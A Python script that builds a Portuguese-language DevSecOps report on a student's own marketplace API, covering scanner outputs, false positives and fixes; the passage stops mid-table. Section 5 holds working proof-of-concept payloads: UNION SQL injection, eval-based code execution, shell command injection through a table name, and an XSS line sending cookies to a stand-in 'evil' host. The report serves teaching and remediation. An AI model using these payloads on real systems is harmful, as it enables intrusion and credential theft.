# -*- coding: utf-8 -*-
"""Conteúdo do Relatório Técnico DevSecOps (MercadoLeve) — estilo UFSC."""
from gerar_relatorio_ufsc import PDF

pdf = PDF()
pdf.cover()

pdf.toc([
    ("1", "INTRODUÇÃO", None),
    ("2", "DESCRIÇÃO DO SISTEMA E FERRAMENTAL", None),
    ("2.1", "Contexto de uso e lógica de negócio", True),
    ("2.2", "Stack tecnológico", True),
    ("2.3", "Arquitetura", True),
    ("2.4", "Plataforma de CI/CD e ferramental por etapa", True),
    ("3", "EVIDÊNCIAS DE EXECUÇÃO", None),
    ("3.1", "Secret Detection — Gitleaks", True),
    ("3.2", "SCA — pip-audit e Trivy", True),
    ("3.3", "SAST — Bandit e Semgrep", True),
    ("3.4", "IaC Scanning — Checkov e Trivy", True),
    ("3.5", "DAST — OWASP ZAP", True),
    ("4", "ANÁLISE DE FALSOS POSITIVOS E ALERTAS IRRELEVANTES", None),
    ("4.1", "Gitleaks — chave AWS de exemplo ignorada", True),
    ("4.2", "SAST pós-correção — B608 e avoid-sqlalchemy-text", True),
    ("4.3", "SAST — B404 e B110 (informativos)", True),
    ("4.4", "SCA — vulnerabilidades residuais", True),
    ("4.5", "IaC — boas práticas e risco aceito", True),
    ("4.6", "DAST — ruído de cabeçalhos e limitação metodológica", True),
    ("5", "IDENTIFICAÇÃO E CORREÇÃO DE FALHAS REAIS", None),
    ("5.1", "Injeção de SQL na busca de produtos", True),
    ("5.2", "RCE via eval() na regra de precificação", True),
    ("5.3", "Injeção de comando no backup", True),
    ("5.4", "Hashing de senha com MD5", True),
    ("5.5", "XSS armazenado na vitrine", True),
    ("5.6", "Quebra de controle de acesso (IDOR)", True),
    ("5.7", "Demais falhas corrigidas", True),
    ("6", "SÍNTESE DE RESULTADOS E CONCLUSÃO", None),
    ("6.1", "Antes × Depois por ferramenta", True),
    ("6.2", "Conclusão", True),
    ("A", "APÊNDICE A — WORKFLOW DE CI/CD (GITHUB ACTIONS)", None),
])

# ===========================================================================
# 1 INTRODUÇÃO
# ===========================================================================
pdf.add_page()
pdf.ch1("1", "Introdução")
pdf.body(
    "Este relatório documenta o projeto, a implementação e a análise crítica de uma "
    "esteira completa de DevSecOps aplicada ao MercadoLeve, uma API de marketplace de "
    "autoria própria construída com FastAPI e PostgreSQL. O objetivo do trabalho foi "
    "projetar uma esteira automatizada de CI/CD capaz de varrer o código-fonte, a "
    "infraestrutura como código e a aplicação em execução, gerando um relatório "
    "analítico sobre as vulnerabilidades encontradas.")
pdf.body(
    "A esteira foi implementada em GitHub Actions e contempla as cinco análises "
    "obrigatórias: Secret Detection, SCA (Software Composition Analysis), SAST (Static "
    "Application Security Testing), IaC Scanning e DAST (Dynamic Application Security "
    "Testing). Todas as ferramentas foram efetivamente executadas, gerando artefatos "
    "reais nos formatos JSON, SARIF e HTML, disponíveis no diretório security-reports/ "
    "do repositório.")
pdf.body(
    "Foram identificadas vulnerabilidades de impacto real — incluindo injeção de SQL, "
    "execução remota de código (RCE), injeção de comandos do sistema operacional, XSS "
    "armazenado, quebra de controle de acesso (IDOR) e hashing de senha com MD5 — todas "
    "exploradas em prova de conceito contra a aplicação em execução e posteriormente "
    "corrigidas e revalidadas. O quadro a seguir resume os achados da versão vulnerável "
    "do sistema, antes da remediação.")
pdf.table(
    ["Etapa", "Ferramenta(s)", "Achados", "Reais (médio+)", "Falsos pos. / ruído"],
    [
        ["Secret Detection", "Gitleaks", "6", "6", "0 (1 ignorado corretamente)"],
        ["SCA", "pip-audit / Trivy", "51 / 36", "30+ (1 crítica)", "transitivos"],
        ["SAST", "Bandit / Semgrep", "8 / 7", "6", "2 (baixa relev.)"],
        ["IaC Scanning", "Checkov / Trivy", "54 / 28", "~18 (1 crítica)", "boas práticas"],
        ["DAST", "OWASP ZAP", "13 alertas", "1 Alto + 2 Médios", "headers / ruído"],
    ],
    [33, 33, 22, 30, 42],
    aligns=["L", "L", "C", "C", "C"],
    caption="Tabela 1 — Resumo dos achados por etapa (antes da correção)",
)

# ===========================================================================
# 2 DESCRIÇÃO DO SISTEMA E FERRAMENTAL
# ===========================================================================
pdf.add_page()
pdf.ch1("2", "Descrição do Sistema e Ferramental")

pdf.ch2("2.1", "Contexto de uso e lógica de negócio")
pdf.body(
    "O MercadoLeve é uma API de marketplace que conecta vendedores e compradores. Ela "
    "suporta o ciclo de compra completo e concentra dados sensíveis (credenciais, "
    "endereços de entrega e dados de pagamento), o que lhe confere uma superfície de "
    "ataque relevante. As funcionalidades de negócio implementadas são:")
pdf.bullet([
    "Identidade e acesso: cadastro de usuários e vendedores, login com emissão de token "
    "JWT e um nível administrativo com privilégios elevados.",
    "Catálogo: cadastro de produtos por vendedores, listagem e busca textual com "
    "ordenação dinâmica.",
    "Compra: carrinho de compras, checkout com cálculo de total e notificação a um "
    "gateway de pagamento, e consulta de pedidos.",
    "Conteúdo de usuário: avaliações (reviews) de produtos e uma vitrine HTML pública "
    "que renderiza essas avaliações.",
    "Administração: listagem de usuários, backup de tabelas, importação de catálogo via "
    "YAML e aplicação de regras dinâmicas de precificação.",
])

pdf.ch2("2.2", "Stack tecnológico")
pdf.table(
    ["Camada", "Tecnologia"],
    [
        ["Linguagem", "Python 3.12"],
        ["Framework web / API", "FastAPI 0.115 (Starlette / Uvicorn ASGI)"],
        ["ORM / Banco de dados", "SQLAlchemy 2.0 + PostgreSQL 15"],
        ["Autenticação", "JWT (python-jose) + hashing de senha (bcrypt via passlib)"],
        ["Templates / vitrine", "Jinja2"],
        ["Conteinerização", "Docker + docker-compose"],
        ["IaC — nuvem", "Terraform (AWS: S3, RDS, EC2, Security Groups)"],
        ["IaC — orquestração", "Kubernetes (Deployment, Service, NetworkPolicy)"],
        ["CI/CD", "GitHub Actions"],
    ],
    [45, 135],
    aligns=["L", "L"],
    caption="Tabela 2 — Stack tecnológico do MercadoLeve",
    fonte=False,
)
pdf.body(
    "Repositório (preencher com a URL após o push): "
    "https://github.com/<usuario>/mercadoleve. A esteira encontra-se em "
    ".github/workflows/devsecops.yml.")

pdf.ch2("2.3", "Arquitetura")
pdf.code(
    "                       GitHub (push / pull_request)\n"
    "                                  |\n"
    "                                  v\n"
    "        +---------------- GitHub Actions: DevSecOps Pipeline ----------------+\n"
    "        |                                                                     |\n"
    " [1] Secret Detection  [2] SCA          [3] SAST        [4] IaC Scan          |\n"
    "     Gitleaks          pip-audit+Trivy  Semgrep+Bandit  Checkov+Trivy         |\n"
    "     (git history)     (requirements)   (app/)          (Docker/TF/K8s)       |\n"
    "        |                  |               |               |                  |\n"
    "        +------------------+------+--------+---------------+                  |\n"
    "                                  v (needs: sast, sca)                        |\n"
    "                       [5] DAST - docker compose up + OWASP ZAP               |\n"
    "                           (API em execução, scan via OpenAPI)                |\n"
    "        +---------------------------------------------------------------------+\n"
    "                                  v\n"
    "                   Relatórios SARIF -> aba Security (Code Scanning)",
    caption="Figura 1 — Topologia do pipeline DevSecOps no GitHub Actions",
)
pdf.body(
    "Em tempo de aplicação, o cliente HTTP comunica-se com a API FastAPI (servida por "
    "Uvicorn), que persiste no PostgreSQL via SQLAlchemy, renderiza a vitrine pública "
    "com Jinja2 e chama um gateway de pagamento externo no checkout. Em produção, o "
    "artefato é uma imagem Docker executada em EC2/Kubernetes, com armazenamento de "
    "imagens de produtos em um bucket S3.")

pdf.ch2("2.4", "Plataforma de CI/CD e ferramental por etapa")
pdf.table(
    ["Etapa", "Ferramenta", "Papel"],
    [
        ["Secret Detection", "Gitleaks 8.30", "Varre todo o histórico de commits por "
         "segredos (regex + entropia)."],
        ["SCA", "pip-audit 2.10 + Trivy", "Vulnerabilidades conhecidas (CVE/GHSA) nas "
         "dependências de requirements.txt."],
        ["SAST", "Semgrep 1.16 + Bandit 1.9", "Padrões inseguros no código-fonte "
         "(rulesets p/python e p/security-audit)."],
        ["IaC Scanning", "Checkov 3.3 + Trivy config", "Conformidade de Dockerfile, "
         "docker-compose, Terraform e Kubernetes."],
        ["DAST", "OWASP ZAP (stable)", "Teste dinâmico ativo da API em execução, "
         "importando a especificação OpenAPI."],
    ],
    [30, 40, 110],
    aligns=["L", "L", "L"],
    caption="Tabela 3 — Ferramental por etapa de análise",
    fonte=False,
)
pdf.body(
    "Em todas as etapas adotou-se a estratégia de duas ferramentas complementares "
    "(exceto DAST), reduzindo pontos cegos: o Bandit é forte em padrões Python "
    "específicos (MD5, shell=True), enquanto o Semgrep traz regras semânticas mais "
    "amplas; o Checkov tem catálogo extenso de políticas AWS e o Trivy classifica "
    "melhor a severidade. O workflow completo é apresentado no Apêndice A.")

# ===========================================================================
# 3 EVIDÊNCIAS
# ===========================================================================
pdf.add_page()
pdf.ch1("3", "Evidências de Execução")
pdf.body(
    "As saídas a seguir foram capturadas da execução real das ferramentas sobre o "
    "repositório do MercadoLeve. Os artefatos completos (JSON/SARIF/HTML) encontram-se "
    "no diretório security-reports/.")

pdf.ch2("3.1", "Secret Detection — Gitleaks")
pdf.code(
    "$ gitleaks detect --source . --report-format json -v\n"
    "Finding:  STRIPE_API_KEY=REDACTED       RuleID: stripe-access-token\n"
    "  File: .env  Line: 3   Commit: d145abb   Author: Pedro Fontoura\n"
    "Finding:  github-pat REDACTED            RuleID: github-pat\n"
    "  File: .env  Line: 6   Commit: d145abb\n"
    "Finding:  STRIPE_API_KEY ... REDACTED    File: app/config.py  Line: 24\n"
    "Finding:  STRIPE_API_KEY: REDACTED       File: docker-compose.yml  Line: 20\n"
    "Finding:  STRIPE_API_KEY REDACTED        File: infra/k8s/deployment.yaml  Line: 34\n"
    "Finding:  password = \"REDACTED\"          RuleID: hashicorp-tf-password\n"
    "  File: infra/terraform/main.tf  Line: 32\n"
    "6:18PM INF 6 commits scanned.\n"
    "WRN leaks found: 6",
    caption="Saída — Gitleaks (6 segredos em 6 commits varridos)",
)
pdf.body(
    "O Gitleaks detectou 6 segredos: 4 tokens Stripe, 1 GitHub Personal Access Token e "
    "1 senha de banco no Terraform. Crucialmente, encontrou o segredo mesmo no arquivo "
    ".env já removido do versionamento, provando o valor de varrer o histórico — o "
    "arquivo persiste nos commits d145abb a 9a2c73e.")

pdf.ch2("3.2", "SCA — pip-audit e Trivy")
pdf.code(
    "$ pip-audit -r requirements.txt\n"
    "Found 51 known vulnerabilities in 9 packages\n"
    "Name             Version   ID                Fix Versions\n"
    "jinja2           3.1.2     CVE-2024-22195    3.1.3\n"
    "requests         2.31.0    CVE-2024-35195    2.32.0\n"
    "cryptography     41.0.7    CVE-2023-50782    42.0.0\n"
    "python-jose      3.3.0     PYSEC-2024-232/233\n"
    "python-multipart 0.0.6     CVE-2024-53981    0.0.18\n"
    "urllib3          2.0.6     CVE-2024-37891    2.2.2\n"
    "starlette        0.27.0    CVE-2024-47874    0.40.0\n"
    "... (51 no total)\n\n"
    "$ trivy fs --scanners vuln .\n"
    "requirements.txt: 36 vulnerabilidades (1 CRITICAL, 17 HIGH, 18 MEDIUM)\n"
    "  CRITICAL  python-jose 3.3.0  CVE-2024-33663  algorithm confusion (ECDSA)",
    caption="Saída — pip-audit (51) e Trivy (36); destaque para a CVE crítica do python-jose",
)

pdf.ch2("3.3", "SAST — Bandit e Semgrep")
pdf.code(
    "$ bandit -r app/\n"
    ">> B324 hashlib   Use of weak MD5 hash for security    [High]   app/auth.py:19\n"
    ">> B602 subprocess shell=True                          [High]   app/routers/admin.py:27\n"
    ">> B501 request verify=False (sem validacao TLS)       [High]   app/routers/orders.py:52\n"
    ">> B506 yaml_load  Use of unsafe yaml load             [Medium] app/routers/admin.py:38\n"
    ">> B307 eval  Use of possibly insecure function        [Medium] app/routers/admin.py:59\n"
    ">> B608 hardcoded_sql_expressions (SQL injection)      [Medium] app/routers/products.py:27\n"
    ">> B404 import subprocess / B110 try-except-pass       [Low]    (2 itens)\n"
    "Total issues: 8  (High: 3, Medium: 3, Low: 2)\n\n"
    "$ semgrep --config=p/python --config=p/security-audit app/\n"
    "Ran 200 rules on 14 files: 7 findings.\n"
    "  insecure-hash-algorithm-md5 / md5-used-as-password    app/auth.py:19\n"
    "  subprocess-shell-true                                 app/routers/admin.py:27\n"
    "  avoid-pyyaml-load                                     app/routers/admin.py:38\n"
    "  eval-detected                                         app/routers/admin.py:59\n"
    "  disabled-cert-validation                              app/routers/orders.py:49\n"
    "  avoid-sqlalchemy-text                                 app/routers/products.py:32",
    caption="Saída — Bandit (8) e Semgrep (7); achados convergentes",
)

pdf.ch2("3.4", "IaC Scanning — Checkov e Trivy")
pdf.code(
    "$ checkov -d . --framework dockerfile terraform kubernetes\n"
    "[terraform]  passed=18  failed=27\n"
    "[kubernetes] passed=67  failed=23\n"
    "[dockerfile] passed=27  failed=4\n"
    "  CKV_AWS_20   aws_s3_bucket   -> S3 ACL permite leitura publica\n"
    "  CKV_AWS_17   aws_db_instance -> RDS publicamente acessivel\n"
    "  CKV_AWS_16   aws_db_instance -> RDS sem criptografia em repouso\n"
    "  CKV_AWS_24   security_group  -> ingress 0.0.0.0/0 na porta 22 (SSH)\n"
    "  CKV_K8S_16   Deployment      -> container privilegiado\n"
    "  CKV_K8S_39   Deployment      -> capability CAP_SYS_ADMIN\n"
    "  CKV_DOCKER_3 Dockerfile      -> container roda como root\n"
    "  CKV_DOCKER_7 Dockerfile      -> imagem base com tag 'latest'\n"
    "  ... (54 falhas no total)\n\n"
    "$ trivy config .\n"
    "28 misconfiguracoes (1 CRITICAL, 16 HIGH, 11 MEDIUM)\n"
    "  HIGH AWS-0107 SSH 0.0.0.0/0 | AWS-0180 RDS publico | KSV-0017 Privileged",
    caption="Saída — Checkov (54 falhas) e Trivy config (28 misconfigs)",
)

pdf.ch2("3.5", "DAST — OWASP ZAP")
pdf.body(
    "O ZAP foi executado de duas formas: baseline (passivo, sobre a raiz) e, "
    "principalmente, API scan ativo importando a especificação OpenAPI (/openapi.json, "
    "18 endpoints), que exercita ataques reais contra cada rota.")
pdf.code(
    "$ docker run ... zaproxy zap-api-scan.py -t .../openapi.json -f openapi\n"
    "WARN-NEW: SQL Injection [40018] x 2\n"
    "   /products/search?q=%27&order=name     (500 Internal Server Error)\n"
    "   /products/search?q=q&order=%27        (500 Internal Server Error)\n"
    "   -> classificado como 'SQL Injection - PostgreSQL' (Risk: High)\n"
    "WARN-NEW: Content Security Policy (CSP) Header Not Set [10038]\n"
    "WARN-NEW: Missing Anti-clickjacking Header [10020]\n"
    "WARN-NEW: X-Content-Type-Options Header Missing [10021] x 7\n"
    "WARN-NEW: A Server Error response code was returned by the server [100000]\n"
    "FAIL-NEW: 0   WARN-NEW: 8   PASS: 113",
    caption="Saída — OWASP ZAP API scan (injeção de SQL confirmada dinamicamente)",
)
pdf.body(
    "O ZAP confirmou dinamicamente a injeção de SQL em /products/search (tanto no "
    "parâmetro q quanto em order), além de cabeçalhos de segurança ausentes e vazamento "
    "de erros. Essa confirmação por uma ferramenta black-box, independente do SAST, "
    "eleva a confiança de que o achado é real e explorável.")

# ===========================================================================
# 4 FALSOS POSITIVOS
# ===========================================================================
pdf.add_page()
pdf.ch1("4", "Análise de Falsos Positivos e Alertas Irrelevantes")
pdf.body(
    "Ferramentas automatizadas geram ruído. Distinguir o que é risco real do que é "
    "irrelevante no contexto do MercadoLeve é parte central da análise. Abaixo, os "
    "principais casos de falso positivo ou baixa relevância, com a justificativa técnica.")

pdf.ch2("4.1", "Gitleaks — chave AWS de exemplo corretamente ignorada")
pdf.body(
    "O código contém AKIAIOSFODNN7EXAMPLE e a secret key wJalrXUtnFEMI/...EXAMPLEKEY. À "
    "primeira vista pareceriam credenciais vazadas, mas o Gitleaks não as reportou — "
    "corretamente. Trata-se da chave de exemplo da documentação oficial da AWS, "
    "presente na allowlist da ferramenta. É um verdadeiro-negativo desejável: marcá-las "
    "geraria ruído. A lição é que nem todo padrão de credencial é um segredo; o "
    "contexto importa.")

pdf.ch2("4.2", "SAST pós-correção — B608 e avoid-sqlalchemy-text (falsos positivos)")
pdf.body(
    "Após a correção da busca, o Bandit ainda acusa B608 (hardcoded SQL) e o Semgrep "
    "ainda acusa avoid-sqlalchemy-text em products.py. Esses alertas são falsos "
    "positivos: a consulta passou a usar bind parameters (:pattern) para o dado do "
    "usuário, e a única interpolação remanescente é o nome da coluna de ordenação, "
    "validado contra uma lista de permissão (ALLOWED_ORDER). As ferramentas detectam o "
    "padrão sintático f-string + text() mas não conseguem provar que o valor é seguro. "
    "Mantém-se o código, pois a mitigação por whitelist é a recomendada.")

pdf.ch2("4.3", "SAST — B404 e B110 (informativos de baixa relevância)")
pdf.body(
    "O Bandit emite B404 (import subprocess) e B110 (try/except/pass). O B404 é "
    "meramente informativo — importar subprocess não é vulnerabilidade; o que importa é "
    "como se usa (tratado em 5.3). O B110 apontava um except silencioso no checkout, "
    "melhorado para registrar log, mas nunca representou risco explorável.")

pdf.ch2("4.4", "SCA — vulnerabilidades residuais sem correção aplicável")
pdf.body(
    "Após atualizar as dependências, restaram 18 alertas. A análise mostra que nenhum é "
    "negligência: são CVEs com identificador 2025/2026 divulgados após o baseline de "
    "versões corrigidas, ou presos por compatibilidade transitiva — por exemplo, o "
    "starlette não pode ser elevado à série 1.x sem quebrar o FastAPI 0.115, e o "
    "pyasn1 é fixado em <0.5 pelo python-jose. São riscos aceitos e rastreados para a "
    "próxima janela de manutenção, não falhas ativas exploráveis no contexto atual.")

pdf.ch2("4.5", "IaC — boas práticas de defesa em profundidade e risco aceito")
pdf.body(
    "Parte dos achados de IaC não são vulnerabilidades, e sim recomendações de robustez "
    "operacional: Performance Insights, Enhanced Monitoring, cross-region replication do "
    "S3, uso de digest de imagem e imagePullPolicy: Always. Não ampliam a superfície de "
    "ataque do MercadoLeve e foram classificados como melhorias futuras.")
pdf.body(
    "Um caso instrutivo é o AWS-0104 (egress 0.0.0.0/0), marcado como CRITICAL pelo "
    "Trivy mesmo após a correção: permite-se deliberadamente saída HTTPS (porta 443) "
    "para qualquer destino, pois a API precisa falar com o gateway de pagamento e o S3. "
    "Bloquear todo o egress quebraria o negócio; é um risco aceito conscientemente, "
    "ilustrando que a severidade atribuída pela ferramenta nem sempre equivale ao risco "
    "no contexto da aplicação.")

pdf.ch2("4.6", "DAST — ruído de cabeçalhos e limitação metodológica")
pdf.body(
    "O ZAP lista vários alertas Low/Informational: Storable and Cacheable Content em "
    "respostas de API (irrelevante para JSON dinâmico), Unexpected Content-Type na "
    "vitrine HTML (que é, de fato, HTML — esperado) e dezenas de Client Error (4xx) nos "
    "endpoints que exigem autenticação (o scanner não estava autenticado). São "
    "esperados e não indicam falha.")
pdf.body(
    "Limitação metodológica importante: o ZAP rodou sem autenticação. Por isso não "
    "exercitou as rotas de /admin (RCE via eval e injeção de comando) nem o XSS "
    "armazenado, que exigem sessão válida. Isso explica por que o DAST não os encontrou "
    "e reforça a complementaridade entre SAST e DAST: o SAST viu o código dessas rotas, "
    "enquanto o DAST confirmou a injeção de SQL não autenticada. Nenhuma ferramenta "
    "isolada é suficiente.")

# ===========================================================================
# 5 FALHAS REAIS
# ===========================================================================
pdf.add_page()
pdf.ch1("5", "Identificação e Correção de Falhas Reais")
pdf.body(
    "Esta seção detalha as vulnerabilidades de médio ou maior risco confirmadas como "
    "reais. Para cada uma: a falha apontada pela ferramenta, o impacto no MercadoLeve, "
    "a prova de exploração e a correção aplicada com a respectiva verificação.")
pdf.table(
    ["#", "Vulnerabilidade", "CWE", "Risco", "Detectada por", "Status"],
    [
        ["1", "Injeção de SQL na busca", "CWE-89", "Crítico", "Bandit, Semgrep, ZAP", "Corrigida"],
        ["2", "RCE via eval() (regra de preço)", "CWE-95", "Crítico", "Bandit, Semgrep", "Corrigida"],
        ["3", "Injeção de comando no backup", "CWE-78", "Crítico", "Bandit, Semgrep", "Corrigida"],
        ["4", "Hashing de senha com MD5", "CWE-327", "Alto", "Bandit, Semgrep", "Corrigida"],
        ["5", "XSS armazenado na vitrine", "CWE-79", "Alto", "Revisão (autoescape)", "Corrigida"],
        ["6", "IDOR em pedidos / carrinho", "CWE-639", "Alto", "Revisão / PoC", "Corrigida"],
        ["7", "TLS desabilitado (verify=False)", "CWE-295", "Médio", "Bandit, Semgrep", "Corrigida"],
        ["8", "Segredos hardcoded / no git", "CWE-798", "Alto", "Gitleaks", "Corrigida"],
        ["9", "Dependência crítica python-jose", "CWE-1395", "Crítico", "Trivy, pip-audit", "Corrigida"],
        ["10", "IaC: container privilegiado", "CWE-250", "Alto", "Checkov, Trivy", "Corrigida"],
        ["11", "IaC: S3 público / RDS exposto", "CWE-732", "Alto", "Checkov, Trivy", "Corrigida"],
        ["12", "CORS '*' + credenciais / DEBUG", "CWE-942", "Médio", "Revisão / ZAP", "Corrigida"],
    ],
    [8, 52, 22, 20, 42, 20],
    aligns=["C", "L", "C", "C", "L", "C"],
    caption="Tabela 4 — Vulnerabilidades reais identificadas e corrigidas",
)

pdf.ch2("5.1", "Injeção de SQL na busca de produtos (Crítico, CWE-89)")
pdf.body(
    "Falha: o endpoint /products/search montava a consulta concatenando os parâmetros q "
    "e order via f-string. Impacto: exfiltração de qualquer dado do banco. A prova de "
    "conceito abaixo extrai e-mails e hashes de senha de todos os usuários via UNION.")
pdf.code(
    "# ANTES (vulneravel) - app/routers/products.py\n"
    "sql = (\"SELECT id, name, description, price, stock FROM products \"\n"
    "       f\"WHERE name ILIKE '%{q}%' OR description ILIKE '%{q}%' ORDER BY {order}\")\n"
    "rows = db.execute(text(sql)).fetchall()\n\n"
    "# PoC (exploracao real):\n"
    "$ curl --get .../products/search --data-urlencode \\\n"
    "   \"q=' UNION SELECT id, email, password_hash, 0.0, 0 FROM users--\"\n"
    "[ ...,\n"
    "  {\"name\":\"admin@mercadoleve.local\",   \"description\":\"0192023a7bbd73250516f069df18b500\"},\n"
    "  {\"name\":\"vendedor@mercadoleve.local\",\"description\":\"e7d80ffeefa212b7c5c55700e4f7193e\"} ]\n"
    "# o hash 0192023a... e md5('admin123') - trivialmente quebravel (ver 5.4)",
    caption="Exploração — vazamento de credenciais via UNION-based SQL injection",
)
pdf.code(
    "# DEPOIS (corrigido)\n"
    "ALLOWED_ORDER = {\"name\", \"price\", \"stock\", \"id\"}      # lista de permissao\n"
    "if order not in ALLOWED_ORDER: order = \"name\"\n"
    "sql = text(\"SELECT ... FROM products \"\n"
    "           \"WHERE name ILIKE :pattern OR description ILIKE :pattern \"\n"
    "           f\"ORDER BY {order}\")                          # order ja validado\n"
    "rows = db.execute(sql, {\"pattern\": f\"%{q}%\"}).fetchall() # bind parameter",
    caption="Correção — parâmetro vinculado (bind) + whitelist de ordenação",
)
pdf.body(
    "Verificação: após a correção, a mesma PoC retorna 0 linhas (sem vazamento) e o "
    "OWASP ZAP reclassifica a regra 40018 como PASS.")

pdf.ch2("5.2", "RCE via eval() na regra de precificação (Crítico, CWE-95)")
pdf.body(
    "Falha: /admin/pricing-rule avaliava com eval() uma expressão enviada pelo cliente. "
    "Como eval recebe acesso implícito a __builtins__, obtém-se execução arbitrária de "
    "código no servidor. Impacto: comprometimento total do host da aplicação.")
pdf.code(
    "# ANTES:  final_price = eval(expression, {\"price\": price})\n"
    "# PoC:\n"
    "$ curl -X POST .../admin/pricing-rule -H \"Authorization: Bearer <admin>\" \\\n"
    "   -d '{\"expression\":\"__import__(\\\"os\\\").popen(\\\"id\\\").read()\",\"base_price\":100}'\n"
    "{\"final_price\": \"uid=501(fontoura) gid=20(staff) ... Darwin ... arm64\"}   # RCE!\n\n"
    "# DEPOIS: avaliador aritmetico seguro baseado em AST (sem eval)\n"
    "_OPS = {ast.Add: operator.add, ast.Sub: ..., ast.Mult: ..., ast.Div: ...}\n"
    "def _safe_arith(node, price):   # aceita so numeros, a variavel 'price' e + - * /\n"
    "    ...                          # qualquer outro no -> ValueError -> HTTP 400",
    caption="Exploração e correção — eval() substituído por avaliador AST restrito",
)
pdf.body(
    "Verificação: a PoC passou a retornar HTTP 400; a regra legítima price*0.9 continua "
    "funcionando (retorna 90.0).")

pdf.ch2("5.3", "Injeção de comando no backup (Crítico, CWE-78)")
pdf.body(
    "Falha: /admin/backup executava subprocess.run(cmd, shell=True) interpolando o nome "
    "da tabela. Impacto: execução de comandos arbitrários no contêiner.")
pdf.code(
    "# ANTES:  cmd = f\"pg_dump -t {table} mercadoleve > /backups/{table}.sql\"\n"
    "#         subprocess.run(cmd, shell=True)\n"
    "# PoC:    {\"table\": \"users; echo PWNED_$(whoami) > /tmp/ml_pwned.txt; echo done\"}\n"
    "$ cat /tmp/ml_pwned.txt  ->  PWNED_fontoura     # comando injetado executou\n\n"
    "# DEPOIS:\n"
    "if table not in ALLOWED_TABLES: raise HTTPException(400)         # whitelist\n"
    "subprocess.run([\"pg_dump\", \"-t\", table, \"-f\", f\"/backups/{table}.sql\",\n"
    "                \"mercadoleve\"], capture_output=True)            # sem shell=True",
    caption="Exploração e correção — argumentos como lista + whitelist (sem shell)",
)
pdf.body(
    "Verificação: entrada maliciosa passou a retornar HTTP 400 e nenhum metacaractere é "
    "mais interpretado pelo shell.")

pdf.ch2("5.4", "Hashing de senha com MD5 (Alto, CWE-327)")
pdf.body(
    "Falha: senhas eram armazenadas como MD5(senha) — rápido e sem salt. Combinado com "
    "a falha 5.1, o atacante exfiltra os hashes e os quebra instantaneamente (MD5 de "
    "senhas comuns está em qualquer rainbow table). Correção: migração para bcrypt "
    "(adaptativo, com salt) via passlib.")
pdf.code(
    "# ANTES:  return hashlib.md5(password.encode()).hexdigest()\n"
    "# DEPOIS: pwd_context = CryptContext(schemes=[\"bcrypt\"], deprecated=\"auto\")\n"
    "#         return pwd_context.hash(password)        # $2b$... com salt por usuario",
    caption="Correção — MD5 substituído por bcrypt",
)

pdf.ch2("5.5", "XSS armazenado na vitrine de avaliações (Alto, CWE-79)")
pdf.body(
    "Falha: a vitrine HTML renderizava avaliações com Jinja2 Template(..., "
    "autoescape=False). Um comentário com <script> executa no navegador de qualquer "
    "visitante. Impacto: roubo de sessão/cookies e ações em nome da vítima.")
pdf.code(
    "# PoC: review com comment = <script>document.location='https://evil/?c='+document.cookie</script>\n"
    "# ANTES (pagina renderizada):  <li>5/5 - <script>...</script></li>       # executa!\n"
    "# DEPOIS (autoescape=True):     <li>5/5 - &lt;script&gt;...&lt;/script&gt;</li>   # inerte",
    caption="Exploração e correção — autoescape habilitado",
)

pdf.ch2("5.6", "Quebra de controle de acesso / IDOR (Alto, CWE-639)")
pdf.body(
    "Falha: GET /orders/{id} e DELETE /cart/item/{id} não verificavam a propriedade do "
    "recurso. Impacto: qualquer usuário lê pedidos alheios (endereço de entrega, "
    "valores) e manipula carrinhos de terceiros.")
pdf.code(
    "# PoC: usuario 'atacante' le o pedido 1 (do admin):\n"
    "$ curl .../orders/1 -H \"Authorization: Bearer <atacante>\"\n"
    "{\"order_id\":1,\"user_id\":1,\"shipping_address\":\"Rua do Admin, 100 - confidencial\"}\n\n"
    "# DEPOIS: checagem de propriedade\n"
    "if order.user_id != user.id and not user.is_admin:\n"
    "    raise HTTPException(403, \"Acesso negado a este pedido\")",
    caption="Exploração e correção — verificação de propriedade do recurso",
)
pdf.body("Verificação: o acesso cruzado passou a retornar HTTP 403.")

pdf.ch2("5.7", "Demais falhas corrigidas")
pdf.ch3("TLS desabilitado — verify=False (Médio, CWE-295)")
pdf.body(
    "O checkout chamava o gateway com requests.post(..., verify=False), abrindo espaço "
    "para man-in-the-middle e vazamento da chave Stripe. Removeu-se o parâmetro (a "
    "validação de certificado volta a ser padrão) e o except silencioso passou a "
    "registrar log.")
pdf.ch3("Segredos no código e no histórico (Alto, CWE-798)")
pdf.body(
    "Chaves Stripe, GitHub PAT e senha do Terraform estavam hardcoded e o .env foi "
    "commitado. Correção: remoção do .env do versionamento, .gitignore apropriado, "
    "leitura obrigatória via variáveis de ambiente (sem fallback inseguro) e o próprio "
    "Gitleaks no CI como gate que barra novos vazamentos. Observação importante: como os "
    "segredos já entraram no histórico, a remediação completa exige rotacionar todas as "
    "credenciais e reescrever o histórico (git filter-repo) — remover o arquivo não "
    "basta.")
pdf.ch3("Dependência crítica — python-jose (Crítico, CWE-1395)")
pdf.body(
    "A CVE-2024-33663 (confusão de algoritmo) permitiria forjar tokens JWT. Atualizada "
    "para 3.4.0; o conjunto de dependências foi elevado para versões corrigidas "
    "(jinja2, requests, cryptography, urllib3, certifi, python-multipart, starlette).")
pdf.ch3("IaC — privilégios e exposição (Alto, CWE-250 / CWE-732)")
pdf.bullet([
    "Dockerfile: passou a usar tag fixa (python:3.12-slim), usuário não-root (UID "
    "10001), COPY seletivo (em vez de ADD .) e HEALTHCHECK.",
    "Terraform: S3 com public access block, criptografia e versionamento; RDS privado, "
    "cifrado, multi-AZ e com proteção contra exclusão; Security Group sem SSH aberto a "
    "0.0.0.0/0; EC2 com IMDSv2 e EBS cifrado.",
    "Kubernetes: removidos privileged e CAP_SYS_ADMIN; runAsNonRoot, "
    "readOnlyRootFilesystem, drop ALL capabilities, limites de CPU/memória, probes, "
    "namespace dedicado e NetworkPolicy.",
])
pdf.ch3("CORS permissivo e DEBUG (Médio, CWE-942)")
pdf.body(
    "O CORS usava allow_origins=['*'] com allow_credentials=True (combinação proibida "
    "pela especificação e perigosa) e o DEBUG=true vazava stack traces. Corrigidos para "
    "origens explícitas, métodos e headers restritos, DEBUG=false por padrão e "
    "cabeçalhos de segurança (CSP, X-Content-Type-Options, X-Frame-Options, HSTS, "
    "Referrer-Policy) adicionados via middleware.")

# ===========================================================================
# 6 SÍNTESE
# ===========================================================================
pdf.add_page()
pdf.ch1("6", "Síntese de Resultados e Conclusão")
pdf.ch2("6.1", "Antes × Depois por ferramenta")
pdf.table(
    ["Etapa / Ferramenta", "Antes", "Depois", "Comentário"],
    [
